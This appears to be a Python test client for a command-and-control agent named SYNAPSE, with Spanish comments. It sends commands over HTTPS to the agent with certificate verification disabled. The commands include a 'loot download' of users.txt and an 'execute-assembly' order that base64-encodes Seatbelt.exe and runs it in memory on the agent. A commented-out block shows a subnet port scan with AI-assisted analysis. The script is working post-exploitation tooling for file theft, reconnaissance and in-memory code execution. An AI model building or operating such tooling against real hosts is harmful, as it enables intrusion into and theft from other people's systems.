import json
import ssl
import urllib.request
import sys
import os

import base64

# --- CONFIGURACIÓN DE LA PRUEBA ---
AGENT_HOST = "localhost"  # Si usas WSL, este valor se actualizará automáticamente
AGENT_PORT = 4443
API_KEY = "clave"

# --- CONSTRUCCIÓN DEL COMANDO A ENVIAR ---
# ¡AQUÍ ESTÁ LA MAGIA!
# Le ordenamos al agente que ejecute el comando 'scan' con los argumentos necesarios,
# incluyendo el flag '--intel' para activar el análisis con Ollama.

"""
comando_a_enviar = {
    "comando": "scan",
    "args": [
        "192.168.1.0/24",  # Argumento 1: el objetivo
        "22,80,443",       # Argumento 2: los puertos
        "--intel"          # Argumento 3: el flag para activar la IA
        # También podrías añadir otros flags como:
        # "-o", "csv",
        # "-c", "500"
    ]
}"""

# En test_agent.py
comando_a_enviar = {
    "comando": "loot",
    "args": [
        "download",
        "-f", "users.txt" # ¡Usa dobles barras invertidas en JSON!
    ]
}
# --- LÓGICA DE LA CONEXIÓN (sin cambios) ---

# --- NUEVO COMANDO A ENVIAR ---
try:
    # 1. Leer el .exe como bytes
    with open("Seatbelt.exe", "rb") as f:
        assembly_bytes = f.read()
    
    # 2. Codificarlo en Base64
    assembly_base64 = base64.b64encode(assembly_bytes).decode("utf-8")

    # 3. Construir la orden
    comando_a_enviar = {
        "comando": "execute-assembly",
        "args": [
            assembly_base64,
            "system" # Argumento para Seatbelt: "system" ejecuta una colección de chequeos
        ]
    }
    
except FileNotFoundError:
    print("Error: 'Seatbelt.exe' no encontrado. Descárgalo y ponlo en la misma carpeta.")
    exit()


def test_agent():
    """
    Se conecta al agente SYNAPSE y envía un comando.
    """
    url = f"https://{AGENT_HOST}:{AGENT_PORT}/command"
    headers = {
        "Content-Type": "application/json",
        "X-API-Key": API_KEY
    }
    data = json.dumps(comando_a_enviar).encode("utf-8")

    print(f"[*] Intentando conectar a: {url}")
    print(f"[*] Enviando orden al agente: {json.dumps(comando_a_enviar, indent=2)}")

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    try:
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        # Aumentamos el timeout porque el análisis de la IA puede tardar
        with urllib.request.urlopen(req, context=context, timeout=60) as response:
            print("\n[+] ¡CONEXIÓN EXITOSA!")
            print(f"[*] Código de estado HTTP: {response.getcode()}")
            
            response_data = json.loads(response.read().decode("utf-8"))
            print("\n--- RESPUESTA DEL AGENTE ---")
            
            # La respuesta del agente contendrá toda la salida de la terminal,
            # incluyendo el log del escaneo y el log de la generación del informe.
            print("Salida recibida del agente:")
            print("--------------------------")
            print(response_data.get("output"))
            print("--------------------------")
            
            if response_data.get("error"):
                 print(f"\n[!] El agente reportó un error durante la ejecución: {response_data.get('error')}")


    except urllib.error.URLError as e:
        print("\n[!!!] ERROR DE CONEXIÓN (URLError)")
        print(f"      Razón: {e.reason}")
        print("\n--- POSIBLES CAUSAS Y SOLUCIONES ---")
        print("      1. ¿Está el agente 'scaner-pro.exe agent ...' ejecutándose?")
        print("      2. ¿Has creado una regla en el Firewall de Windows para el puerto 4443?")
        return
        
    except Exception as e:
        print(f"\n[!!!] OCURRIÓ UN ERROR INESPERADO: {e}")

# --- PUNTO DE ENTRADA (sin cambios) ---
if __name__ == "__main__":
    if os.name == 'posix' and 'microsoft' in os.uname().release.lower():
        try:
            with open("/etc/resolv.conf") as f:
                for line in f:
                    if "nameserver" in line:
                        AGENT_HOST = line.split()[1]
                        print(f"[*] Detectado WSL. Apuntando al host de Windows en: {AGENT_HOST}")
                        break
        except FileNotFoundError:
            pass
            
    test_agent()
    sys.exit(0)